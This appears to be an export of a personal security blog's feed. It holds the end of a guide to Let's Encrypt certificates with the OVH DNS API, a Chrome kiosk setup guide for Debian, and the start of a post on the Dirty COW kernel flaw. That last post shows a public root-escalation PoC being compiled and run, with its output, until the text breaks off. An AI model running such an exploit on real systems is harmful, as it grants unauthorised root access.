&lt;p&gt;Now we need to generate the use token in order to validation our keys (you may
need to had execution permissions to the script):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./ovhdns.py --init&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get an other link where we need to authenticate one more time. When it is
done just press the &lt;code&gt;ENTER&lt;/code&gt; key.&lt;/p&gt;
&lt;p&gt;The script indicate the user token to insert in the &lt;code&gt;ovh.conf&lt;/code&gt; file. Be sure to
uncomment the line by deleting the &lt;code&gt;;&lt;/code&gt; at the beginning of the line.&lt;/p&gt;
&lt;p&gt;The configuration file will be needed in the &lt;code&gt;dehydrated&lt;/code&gt; folder, let's just
create a symlink:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ln -s /home/user/letsencrypt.sh-ovh/ovh.conf /home/user/dehydrated/ovh.conf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The hook script configuration is finished, now let's configure the &lt;code&gt;dehydrated&lt;/code&gt;
script.&lt;/p&gt;
&lt;h3 id="dehydrated-configuration"&gt;dehydrated configuration&lt;/h3&gt;
&lt;p&gt;In the domains.txt file, indicate the certificates that you want to generate.
Each line will be a certificate but one certificate can be valid for several
domains. For instance, the following configuration will generate two certificates
each for two domains.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;example.org www.example.org&lt;/span&gt;
&lt;span class="code-line"&gt;gitlab.example.com wikimedia.example.com&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="certificates-generation"&gt;Certificates generation&lt;/h3&gt;
&lt;p&gt;Just launch the dehydrated script (you may need to had execution permission):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./dehydrated -c -t dns-01 -k &amp;#39;/home/user/letsencrypt.sh-ovh/ovhdns.py&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; (re)generate certificates, will renew them if they expire in less than one month&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-t dns-01&lt;/code&gt; use the DNS challenge for acme validation&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; use specific script for hook&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The certificates are stored in &lt;code&gt;/home/user/dehydrated/certs/&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="automatically-renew-certificates"&gt;Automatically renew certificates&lt;/h2&gt;
&lt;p&gt;In order to automatically renew certificate:&lt;/p&gt;
&lt;p&gt;Create a symlink in order to use the certificate and the necessary key. This
is the only moment where we will need root permissions. For
instance, for the gitlab certificate we need &lt;code&gt;gitlab.crt&lt;/code&gt; and &lt;code&gt;gitlab.key&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ln -s /home/user/dehydrated/certs/git.exemple.fr/fullchain.pem /etc/gitlab/ssl/gitlab.crt&lt;/span&gt;
&lt;span class="code-line"&gt;# ln -s /home/user/dehydrated/certs/git.exemple.fr/privkey.pem /etc/gitlab/ssl/gitlab.key&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Add the following line to the crontab (&lt;code&gt;crontab -e&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;15&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dehydrated&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dehydrated&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="n"&gt;sencrypt&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ovh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ovhdns&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="source"&gt;Source&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://ungeek.fr/letsencrypt-api-ovh/"&gt;https://ungeek.fr/letsencrypt-api-ovh/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="disqus-comments"&gt;Disqus comments&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;This is a copy of the Disqus comments for this page&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Christoph Haas - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hi maggick,&lt;/p&gt;
&lt;p&gt;I followed your instructions, the only thing i was uncertain was if I should change ";consumer_key=MA_CLEFS" with the output of "./ovhdns.py --init", then remove the ";" in front.&lt;/p&gt;
&lt;p&gt;I got this error response from the dehydrated-call:
--- snip ---
Traceback (most recent call last):
File "/root/letsencrypt.sh-ovh/ovhdns.py", line 42, in &lt;module&gt;
target=token)
File "/usr/local/lib/python2.7/dist-packages/ovh/client.py", line 375, in post
return self.call('POST', _target, kwargs, _need_auth)
File "/usr/local/lib/python2.7/dist-packages/ovh/client.py", line 436, in call
response=result)
ovh.exceptions.InvalidCredential: This credential is not valid
OVH-Query-ID: FR.ws-2.58ff13c9.3236.2138
--- snap ---&lt;/p&gt;
&lt;p&gt;What could be the cause?&lt;/p&gt;
&lt;p&gt;TIA
Christoph.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Yeah you must replace the "consumer_key" parameter with the output of "./ovhdns.py --init".
It should fix your problem.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Christoph Haas - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;after validating the token, I progressed a little bit:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Responding to challenge for host1.intern.somewithovhhos......&lt;/li&gt;
&lt;li&gt;Responding to challenge for host2.intern.somewithovhhos......&lt;/li&gt;
&lt;li&gt;Challenge is valid!&lt;/li&gt;
&lt;li&gt;Requesting certificate...&lt;/li&gt;
&lt;li&gt;ERROR: An error occurred while sending post-request to https://acme-v01.api.letsen... (Status 403)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Details:
{
"type": "urn:acme:error:unauthorized",
"detail": "Error creating new cert :: authorizations for these names not found or expired: host2.intern.somewithovhhos...",
"status": 403
}&lt;/p&gt;
&lt;p&gt;Traceback (most recent call last):
File "/root/letsencrypt.sh-ovh/ovhdns.py", line 56, in &lt;module&gt;
client.delete('/domain/zone/%s/record/%s' % (basedomain, id_record))
File "/usr/local/lib/python2.7/dist-packages/ovh/client.py", line 385, in delete
return self.call('DELETE', _target, None, _need_auth)
File "/usr/local/lib/python2.7/dist-packages/ovh/client.py", line 441, in call
response=result)
ovh.exceptions.ResourceNotFoundError: This service does not exist&lt;/p&gt;
&lt;p&gt;nor certificate for "host1.intern.somewithovhhos..." nor for "host2.intern.somewithovhhos..." is generated.
Christoph.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2017&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I just test the process again. It still work.
According to the error message you cannot modify the DNS. If you follow the process you should have the permissions.&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="security"></category><category term="programming"></category><category term="SSL"></category><category term="let's encrypt"></category><category term="security"></category></entry><entry><title>Building a kiosk computer with Chrome</title><link href="https://maggick.fr/2016/12/building-a-kiosk-computer-with-chrome.html" rel="alternate"></link><published>2016-12-26T09:10:00+01:00</published><updated>2016-12-26T09:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-12-26:/2016/12/building-a-kiosk-computer-with-chrome.html</id><summary type="html">&lt;p&gt;Building a Kiosk where Google Chrome is running in full screen and user
interaction with the system are reduced to the minimum.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;Building a Kiosk where Google Chrome is running in full screen and user
interaction with the system are reduced to the minimum.&lt;/p&gt;


&lt;h2 id="debian-installation"&gt;Debian installation&lt;/h2&gt;
&lt;p&gt;This will be pass as most of you should be able to install a basic Debian
system. Just set lvm encryption, strong password for root and for the user and
mostly do not install useless program, check only the program you need (ssh for
instance).&lt;/p&gt;
&lt;h2 id="installing-the-packages"&gt;Installing the packages&lt;/h2&gt;
&lt;p&gt;We will need a few more packages to be able to run things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;X (display server)&lt;/li&gt;
&lt;li&gt;A light window manager able to run Chrome in full screen&lt;/li&gt;
&lt;li&gt;Google Chrome&lt;/li&gt;
&lt;li&gt;sudo to be able to impersonate the user&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first operations will be done using root as the sudo command is not
installed yet.&lt;/p&gt;
&lt;p&gt;First we add the Google Chrome repository and the key to check the package
integrity:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Edit the file &lt;code&gt;/etc/apt/source.list&lt;/code&gt; and add the following repository:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;deb http://dl.google.com/linux/chrome/deb/ stable main&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Execute the following command:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;wget -qO- https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then we need to update the package list and install all necessary packages:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get update&lt;/span&gt;
&lt;span class="code-line"&gt;apt-get install --no-install-recommends xorg openbox sudo google-chrome-stable&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Without the &lt;code&gt;--no-install-recommends&lt;/code&gt;parameter some useless packages will be
installed.&lt;/p&gt;
&lt;h2 id="load-chrome-in-kiosk-at-startup"&gt;Load Chrome in kiosk at startup&lt;/h2&gt;
&lt;p&gt;We need a script that will configure and load Chrome at the X server startup.
As we don't want any data saved between each session we will delete the Chrome
profile each time the script is used. Moreover it is in this script that we
choose the starting page of Chrome.&lt;/p&gt;
&lt;p&gt;Create and edit the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo vi /opt/kiosk.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The file content is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span class="normal"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;2&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;4&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;5&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;6&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;7&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;8&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;xset -dpms&lt;/span&gt;
&lt;span class="code-line"&gt;xset s off&lt;/span&gt;
&lt;span class="code-line"&gt;openbox-session &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; rm -rf ~/.&lt;span class="o"&gt;{&lt;/span&gt;config,cache&lt;span class="o"&gt;}&lt;/span&gt;/google-chrome/&lt;/span&gt;
&lt;span class="code-line"&gt;  google-chrome --kiosk --no-first-run  &lt;span class="s1"&gt;&amp;#39;http://localhost&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;Give the execution right to the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo chmod +x /opt/kiosk.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In order to start the X server and launch the &lt;code&gt;kiosk.sh&lt;/code&gt; script, we need to
create a systemd service.&lt;/p&gt;
&lt;p&gt;In order to to that, create and edit the file &lt;code&gt;/etc/systemd/system/kiosk.service&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo vi /etc/systemd/system/kiosk.service&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The content of the file is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;Kiosk&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[Service]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;oneshot&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/usr/bin/sudo –u user /usr/bin/startx /etc/X11/Xsession /opt/kiosk.sh --&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;[Install]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;multi-user.target&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need to enable the script with the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;systemctl enable kiosk&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To run the script use the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;systemctl start kiosk »&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You can also reboot in order to check that the script is automatically launch at
startup.&lt;/p&gt;
&lt;p&gt;If you need a terminal, you can use &lt;ctrl&gt;+&lt;alt&gt;+&lt;F2-9&gt; to get one.&lt;/p&gt;
&lt;h2 id="automatically-mount-usb-key"&gt;Automatically mount USB key&lt;/h2&gt;
&lt;p&gt;If your users need to copy data from the machine this paragraph is for you.
Otherwise this is just informational.&lt;/p&gt;
&lt;p&gt;As our users don't have a shell access they are unable to mount USB key.
Therefore we need to automatically mount them.&lt;/p&gt;
&lt;p&gt;We need the &lt;code&gt;usbmount&lt;/code&gt; package:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install --no-install-recommends usbmount&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The USB keys will be automatically mount into &lt;code&gt;/mnt/usbX&lt;/code&gt;.In order for the user
to have the permissions to right on it we need to add its &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt; in the
&lt;code&gt;usbmount&lt;/code&gt; configuration.&lt;/p&gt;
&lt;p&gt;Edit the file &lt;code&gt;/etc/usbmount/usbmount.conf&lt;/code&gt; and the user &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;guid&lt;/code&gt; to the
following line (the &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt; can be found in &lt;code&gt;/etc/passwd&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;FS_MOUNTOPTIONS=&amp;quot; &amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The line would be something like the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;FS_MOUNTOPTIONS=&amp;quot;uid=1000,gid=1000&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="sources"&gt;Sources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://thepcspy.com/read/building-a-kiosk-computer-ubuntu-1404-chrome/"&gt;https://thepcspy.com/read/building-a-kiosk-computer-ubuntu-1404-chrome/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lukas.zapletalovi.com/2013/08/execute-command-during-start-with-systemd.html"&gt;https://lukas.zapletalovi.com/2013/08/execute-command-during-start-with-systemd.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="security"></category><category term="programming"></category><category term="security"></category><category term="chrome"></category><category term="kiosk"></category></entry><entry><title>CVE 2016-5195 dirtycow</title><link href="https://maggick.fr/2016/12/cve-2016-5195-dirtycow.html" rel="alternate"></link><published>2016-12-11T19:20:00+01:00</published><updated>2016-12-11T19:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-12-11:/2016/12/cve-2016-5195-dirtycow.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ðirtycow logo" class="align-left" src="/media/2016.12/cow.png" width="162"/&gt;&lt;/p&gt;
&lt;p&gt;Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux
Kernel.
"&lt;a href="https://en.wikipedia.org/wiki/Race_condition"&gt;A race condition&lt;/a&gt; was found in
the way the Linux kernel's memory subsystem
handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise
read-only memory mappings and thus increase their privileges on the system."
(&lt;a href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344#"&gt;Source: Red Hat&lt;/a&gt;)&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2016.12/cow.png" alt="Ðirtycow logo" width="162"&gt;&lt;/p&gt;
&lt;p&gt;Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux
Kernel.
"&lt;a href="https://en.wikipedia.org/wiki/Race_condition"&gt;A race condition&lt;/a&gt; was found in
the way the Linux kernel's memory subsystem
handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise
read-only memory mappings and thus increase their privileges on the system."
(&lt;a href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344#"&gt;Source: Red Hat&lt;/a&gt;)&lt;/p&gt;


&lt;p&gt;So globally with the write code doing the right thing a unprivileged user can
get root permission on most GNU/Linux systems.
The satiric web site &lt;a href="https://dirtycow.ninja/"&gt;dirtycow.ninja/&lt;/a&gt; was in the first
time create to make fun of people giving name to vulnerability even a &lt;a href="https://www.youtube.com/watch?v=kEsshExn7aE"&gt;youtube
video&lt;/a&gt; was made. Nevertheless the
wiki of the website (on github) link to a &lt;a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"&gt;few
PoCs&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I test one of this PoCs on my test computer. The exploits were not fully stable
at the time an my computer was sometime friezing just after getting root
privileges.&lt;/p&gt;
&lt;p&gt;I used a modified version of the cowroot.c PoCs host on &lt;a href="https://gist.github.com/joshuaskorich/86c90e12436c873e4a06bd64b461cc43"&gt;a
gist&lt;/a&gt;.
First of all we compile the exploit code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@computer_name dirtycow]$ gcc cowroot.c -o cowroot -pthread&lt;/span&gt;
&lt;span class="code-line"&gt;cowroot.c: In function ‘procselfmemThread’:&lt;/span&gt;
&lt;span class="code-line"&gt;cowroot.c:107:17: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [-Wint-conversion]&lt;/span&gt;
&lt;span class="code-line"&gt;         lseek(f,map,SEEK_SET);&lt;/span&gt;
&lt;span class="code-line"&gt;                 ^~~&lt;/span&gt;
&lt;span class="code-line"&gt;In file included from cowroot.c:27:0:&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/include/unistd.h:337:16: note: expected ‘__off_t {aka long int}’ but argument is of type ‘void *’&lt;/span&gt;
&lt;span class="code-line"&gt; extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;&lt;/span&gt;
&lt;span class="code-line"&gt;                ^~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;cowroot.c: In function ‘main’:&lt;/span&gt;
&lt;span class="code-line"&gt;cowroot.c:144:5: warning: implicit declaration of function ‘asprintf’ [-Wimplicit-function-declaration]&lt;/span&gt;
&lt;span class="code-line"&gt;     asprintf(&amp;amp;backup, &amp;quot;cp %s /tmp/bak&amp;quot;, suid_binary);&lt;/span&gt;
&lt;span class="code-line"&gt;     ^~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;cowroot.c:148:5: warning: implicit declaration of function ‘fstat’ [-Wimplicit-function-declaration]&lt;/span&gt;
&lt;span class="code-line"&gt;     fstat(f,&amp;amp;st);&lt;/span&gt;
&lt;span class="code-line"&gt;     ^~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The warning are not really important after the compilation we just launch the
exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@computer_name dirtycow&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cowroot&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;DirtyCow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;privilege&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;escalation&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Backing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bak&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Size&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;binary&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;47224&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
